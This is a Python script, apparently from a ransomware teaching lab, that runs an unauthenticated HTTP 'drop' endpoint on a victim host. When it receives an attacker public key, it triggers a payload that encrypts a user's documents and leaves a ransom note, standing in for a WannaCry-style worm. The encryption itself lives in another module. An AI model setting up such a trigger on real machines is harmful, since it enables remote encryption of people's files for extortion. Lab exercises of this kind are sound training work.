#!/usr/bin/env python3
"""The victim host's delivery inbox — the worm's drop point, played by hand.

This is NOT the exploit. In the real incident the worm reached this machine
through an exposed service; here the attacker's `deliver` command hands the
attacker PUBLIC key to this small inbox over HTTP, and the inbox performs
exactly what a dropped-and-executed payload does:

  1. persist the attacker public key (the worm's embedded key),
  2. detonate the payload in-process (encrypt the sample documents),
  3. report the result.

The payload CODE is already on this host (baked in at boot); what travels
over the network is only the public key plus the detonation trigger. When
real propagation is added, this inbox is replaced by the worm itself.

Endpoints:
  GET  /status  -> {"status": "clean" | "infected", ...}   (read-only)
  POST /drop    -> body {"attacker_pub_pem": "<PEM>"}       (one-shot)

Run at boot:  python3 /opt/wannacry-v2/wormdoor.py --port 4450
"""

import argparse
import json
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import lab_keylogic

LAB_DIR = Path("/opt/wannacry-v2")
DEFAULT_TARGET = Path("/home/seed/import_folder")
STATE_FILE = LAB_DIR / "participant.json"
KEYLOG_PATH = LAB_DIR / "lab_keylogic.json"
PUB_PATH = LAB_DIR / "attacker_pub.pem"


def victim_participant_id() -> str:
    """The prepared participant id, or the lab default before preparation."""
    try:
        record = json.loads(STATE_FILE.read_text(encoding="utf-8"))
        return record["participant_id"]
    except (OSError, ValueError, KeyError):
        return "as180-host_0"


def status() -> dict:
    if KEYLOG_PATH.exists():
        try:
            record = json.loads(KEYLOG_PATH.read_text(encoding="utf-8"))
            return {
                "status": "infected",
                "participant_id": record.get("participant_id"),
                "files_encrypted": len(record.get("files", {})),
            }
        except (OSError, ValueError):
            return {"status": "unknown"}
    return {"status": "clean", "inbox": str(PUB_PATH)}


def drop(attacker_pub_pem: str) -> dict:
    """Persist the delivered public key and detonate the payload once."""
    if KEYLOG_PATH.exists():
        return {"status": "already_infected"}
    pem = attacker_pub_pem.encode("ascii")
    if b"BEGIN PUBLIC KEY" not in pem:
        return {"status": "rejected", "reason": "not a public key PEM"}
    lab_keylogic.write_atomic(PUB_PATH, pem)
    record = lab_keylogic.payload_exec(
        DEFAULT_TARGET,
        victim_participant_id(),
        pem,
        KEYLOG_PATH,
    )
    return {
        "status": "infected",
        "participant_id": record["participant_id"],
        "files_encrypted": len(record["files"]),
        "note": "payload executed on the victim host; ransom note is in place",
    }


class DoorHandler(BaseHTTPRequestHandler):
    def _send(self, code: int, payload: dict):
        body = json.dumps(payload, indent=2).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path == "/status":
            self._send(200, status())
        else:
            self._send(404, {"status": "not_found"})

    def do_POST(self):
        if self.path != "/drop":
            self._send(404, {"status": "not_found"})
            return
        try:
            length = int(self.headers.get("Content-Length", "0"))
            body = json.loads(self.rfile.read(length).decode("utf-8"))
            result = drop(body.get("attacker_pub_pem", ""))
            code = 200 if result.get("status") in ("infected", "already_infected") else 400
            self._send(code, result)
        except (ValueError, OSError) as error:
            self._send(500, {"status": "error", "reason": str(error)})

    def log_message(self, fmt, *args):
        print(f"wormdoor: {self.address_string()} - {fmt % args}", flush=True)


def main():
    global DEFAULT_TARGET
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--port", type=int, default=4450)
    parser.add_argument("--target", type=Path, default=DEFAULT_TARGET)
    args = parser.parse_args()
    if args.target != DEFAULT_TARGET:
        # Keep module-level constants in sync with explicit CLI overrides.
        DEFAULT_TARGET = args.target
    server = ThreadingHTTPServer(("0.0.0.0", args.port), DoorHandler)
    print(f"wormdoor: delivery inbox listening on port {args.port}", flush=True)
    server.serve_forever()


if __name__ == "__main__":
    main()
